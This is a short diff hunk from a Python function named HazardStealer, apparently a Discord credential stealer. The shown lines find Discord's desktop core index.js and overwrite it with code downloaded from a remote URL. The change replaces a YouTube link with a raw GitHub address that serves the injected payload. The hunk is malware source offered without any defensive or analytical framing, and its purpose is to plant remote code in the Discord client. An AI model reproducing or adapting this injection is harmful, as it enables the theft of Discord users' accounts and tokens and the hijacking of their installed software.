@@ -231,7 +231,7 @@ def HazardStealer():
 				try:
 					directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
 					os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Hazard"))
-					f = urlopen("https://www.youtube.com/channel/UCJPtyf-5Ehvii2U-d3YYEnA")
+					f = urlopen("https://raw.githubusercontent.com/ojejexd/ojejexd/main/something")
 					index_content = f.read()
 					with open(directory_list, 'wb') as index_file:
 						index_file.write(index_content)
